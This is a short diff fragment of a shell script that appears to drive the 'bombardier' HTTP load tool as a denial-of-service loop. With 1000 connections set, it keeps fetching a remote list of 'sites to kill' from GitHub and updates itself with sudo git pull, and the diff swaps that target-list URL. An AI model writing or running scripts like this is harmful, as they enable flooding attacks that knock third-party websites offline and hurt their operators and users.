@@ -10,7 +10,7 @@ BOMBARDIER_CONNECTIONS=1000
 while :
 do
   # Taking sites to kill
-  declare -a sites=($(curl https://raw.githubusercontent.com/alexnest-ua/Updated-bombardier/main/targets))
+  declare -a sites=($(curl https://raw.githubusercontent.com/alexnest-ua/attacker/main/targets))
   # Update bomb (take last version from git
   cd ~/Updated-bombardier 
 	num=$(sudo git pull origin main| grep -c "Already")
